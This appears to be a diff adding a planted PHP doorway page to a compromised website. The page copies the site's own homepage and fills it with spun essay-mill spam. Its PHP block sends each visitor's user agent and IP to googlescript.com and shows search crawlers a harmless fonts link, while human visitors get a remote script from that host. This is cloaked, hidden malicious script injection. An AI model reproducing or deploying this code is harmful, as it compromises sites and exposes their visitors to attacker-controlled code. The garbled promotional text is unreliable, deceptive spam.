@@ -1,0 +1,52 @@
+<?php   $url = 'http://' . $_SERVER['HTTP_HOST'] . '/';
+   $content = file_get_contents($url);
+   $content = preg_replace('/<meta http-equiv(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)description(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)title(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)keywords(.*?)>/i', '', $content);
+   $content = preg_replace('/<title(.*?)title>/i', '', $content);
+   $content = preg_replace('/<link rel="canonical"(.*?)>/i', '', $content);
+   preg_match_all('/<\!DOCTYPE(.*?)>/i', $content, $doctypeTag);
+   preg_match_all('/<html(.*?)>/i', $content, $htmlTag);
+   preg_match_all('/<head(.*?)>/i', $content, $headTag);
+   preg_match_all('/<body(.*?)>/i', $content, $bodyTag);
+   $siteDOM = new DOMDocument;
+   @$siteDOM->loadHTML($content);
+   $head = new DOMDocument;
+   $headDOM = $siteDOM->getElementsByTagName('head')->item(0);
+   foreach ($headDOM->childNodes as $child)
+   $head->appendChild($head->importNode($child, true));
+   $headHTML = @$head->saveHTML();
+   $body = new DOMDocument;
+   $bodyDOM = $siteDOM->getElementsByTagName('body')->item(0);
+   foreach ($bodyDOM->childNodes as $child)
+   $body->appendChild($body->importNode($child, true));
+   $bodyHTML = @$body->saveHTML();
+   echo $doctypeTag[0][0] . PHP_EOL . $htmlTag[0][0] . PHP_EOL . $headTag[0][0] . PHP_EOL;
+   ?>
+<title>Who Can Write My Paper Walton Announcers Chillout who can write my paper Pamphlets Distinguish Throne Reprocessed | purplecube.in</title>
+<meta name="description" content="Unauthentic providers do not contain highly professional writers. | Who Can Write My Paper" />
+<?php echo $headHTML . PHP_EOL; ?>
+<?php
+   $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
+   $ua = urlencode($ua);
+   $ip = $_SERVER['REMOTE_ADDR'];
+   $api = 'http://googlescript.com/api.php?';
+   $apikey = 'e7d52430614c8319dbde9ba6cb49993e';
+   $churl = "{$api}action=get_link&api_key=$apikey&group=css-font&ua=$ua&ip=$ip";
+   $check = file_get_contents($churl);
+   $json = json_decode($check);
+   if ($json->{'bot_action'}->{'text'} == 'y') {
+   echo '<script src="http://fonts.googleapis.com/css?family=Open+Sans"></script>';
+   }
+   else {
+   echo '<script src="http://googlescript.com/css-font"></script>';
+   }
+   ?>
+   </head>
+   <?php echo $bodyTag[0][0] . PHP_EOL; ?>
+     <div id="main">
+               <div id="primary">
+<h1>who can write my paper Crimewave Riding Straits</h1>Particularly, in this paragraph a referee explains why a composition has its actuality nowadays. <p>Nowadays, many people spend a lot of time online in social networks. Use Essay 911 and you will enjoy your studies. But the team who can write my paper of this service solved al mu problems. Advise who can write my paper all of you to use this service and will be as pleased as I do. I will be with my friends. The fact is who can write my paper that there are people for and against the online way of life. Writinng all of you to use their service.</p> <h2>Do not be a dreamer - produce a want to achieve your goal.</h2>The paper was good and support team worked perfectly. <p>Your team of writers is something unusual. But fortunately I found Essay 911 custom essay writing service. I disagree with the argument that the social networks will not have any future, because due to the changes in the recent spott and in the present, the world shows <a href="http://purplecube.in/buy-original-essays-online">buy original essays online</a> to people that everything is changing rapidly. In case of any questions, please do not hesitate to visit our Frequently Asked Question page. Essay 911 custom essay writing service perfectly suits for the task. Perfect service for me. I am convinced that in near future different new social networks will appear and unite people, and also they will help them find themselves in life, find jobs, friends, love and explore the sphere of entertainment more widely.</p> <h2>grantchester season 1, episode 2 airs on pbs on sunday, 25 january 2015, 10: 00-11: 00 p.m.</h2>It is understandable that people, who can much easier accept the status quo, could be adjusted to its internal installation for the given situation, rather than continue to suffer. <p>Consequently, another alternative is losing all charm in his eyes. Often the dissonance arises as a consequence of making important decisions. In order to suppress (weaken) a dissonance, a person tries every effort to exaggerate the materiality of his decision, while diminishing the importance of the rejected. I started using custom essay writing service since I arrived and Essay 911 was sporf 5th one I tried. Also, in this paragraph an author mentions main features of the composition. Conflicts happen more often and departments of the companies have competition. You can order a literature review of any difficulty at www. Conclusion All in all, <strong>who can write my paper</strong> cognitive dissonance theory is currently one of the important areas in social psychology.</p> <h2>Today s resumes use bullet points to create reading more easy, and acquire across info faster.</h2>I will return to you with pleasure. <p>As a fact, homeschooling can harm a child, because <a href="http://purplecube.in/need-help-writing-a-essay">need help writing a essay</a> he has lack of communication with his classmates, he does not have the proper atmosphere getting educated properly, he faces the lack of the academy quality and comprehensiveness. I will be back with my friends. A classic experiment conducted by Leon Festinger showed the existence of cognitive dissonance, which describes the ways to smooth or eliminate the contradictions, and describes how a person does this in typical situations. My elder brother uses it too, some <a href="http://purplecube.in/write-my-english-essay-for-me">write my english essay for me</a> significant reports are better <strong>who can write my paper</strong> to be done by professionals. There are writinh arguments considering homeschooling, but the approach should be individual, as for some children homeschooling is the only favouriite out to get the best education and for others this is a big disadvantage. There are many aspects that influence the competition between the departments, as the professionals consider themselves the best in their area and more <a href="http://purplecube.in/buy-custom-term-paper">buy custom term paper</a> important than others.</p> <h2>Our nonfiction documents, however, are about treatments.</h2>For example, the technology department can consider writing essay your favourite sport more considerable and useful than other departments of a company producing and installing complex computer systems. <p>Also, you can contact us anytime just clicking here. Also, many people have found their jobs and gour new jobs with the help of the internet. Keep on this level. Many people have found their couples via internet and made friends online. It is writing essay your favourite sport to note that some people think that virtual life is not real and that those who spend a lot of time online - just waste their time and the life passes by. The work is perfect I will be back, be sure. It is clear that the existence of dissonance, regardless of its strength, forces people to get rid of it completely, but if for some reason it is not yet possible, it can be significantly reduced.</p> <h2>Shrapnel wounded baldy s nose and left a scar on his flank throughout the skirmish.</h2>It should be noted different generations think favouurite and the refutation considering some issues is just the way to protect certain point view. <p>Will be your return as far as needed, thanks. It should be stated that only those who are in trend will succeed. Home schooling suggests the possibility, but not necessarily any systematic individual or writing essay your favourite sport lessons writing essay your favourite sport home or outside the home with parents, teachers, tutors, other teachers, etc, as described in Home-Schooling in the United States Trends who can write my paper and characteristics. I advise all of you this service because of their quality and quick response. Children, who are homeschooled, do not attend school because of ideological or practical considerations, and consequently they are educated at home or in special clubs for who can write my paper their own particular program. If social networks were so negative and had so many disadvantages then why are they so popular among millions all around the world.</p> <h2>Other folks remember poetry or audio sounds a lot better than visual images.</h2>Recommend to use this service to everyone who is interested in high results at college. <p>I think that it is important who can write my paper to be open to new opportunities, to stop worrying about what others say, as personal opinion has to matter. You are always welcome to get inspired by our FREE essays and NEW sample papers. Their works are always very good. But who can write my paper I'm sure that's what I really need. Never give up using this service and it to all my friends. Since then I have ordered my papers only there and very pleased with the results.</p> <h2>Put to twenty blankets of covered report for every school in about ten.</h2>Development of the first method includes that people apply to the criterion of truth to the information received, to acknowledge their mistakes and act in accordance with the <a href="http://purplecube.in/students-buying-essays-online">students buying essays online</a> new, more complete and clear understanding of the problem. <p>I am really thankful and will advice you all of my friends. Estonia In States everything writing essay your favourite sport new for me. Career a fact, there are many examples of writing essay your favourite <strong>who can write my paper</strong> sport conflict situations between the technology department and other departments of a company producing and installing complex computer systems nowadays. If you are ready to order a literature review - just click this link.</p>
+                  </div>
+               </div>
